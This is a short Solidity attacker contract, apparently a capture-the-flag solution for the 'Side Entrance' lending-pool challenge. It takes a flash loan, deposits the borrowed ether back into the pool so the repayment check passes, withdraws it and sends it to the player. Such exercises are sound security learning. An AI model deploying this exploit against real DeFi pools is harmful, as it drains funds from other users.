// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {

    SideEntranceLenderPool private immutable _sideEntranceLenderPool;
    address private immutable _player;

    constructor(SideEntranceLenderPool sideEntranceLenderPool, address player) {
        _sideEntranceLenderPool = sideEntranceLenderPool;
        _player = player;
    } 

    function attack(uint256 amount) external {
        // executing the flash loan
        _sideEntranceLenderPool.flashLoan(amount);
        _sideEntranceLenderPool.withdraw();
        payable(_player).transfer(address(this).balance);
    }
    /**
     * Called by the flash loan
     */
    function execute() external payable {
        _sideEntranceLenderPool.deposit{value: msg.value}(); // will deposit to the pool, so the flash loan won't revert
    }

    receive() external payable {}

}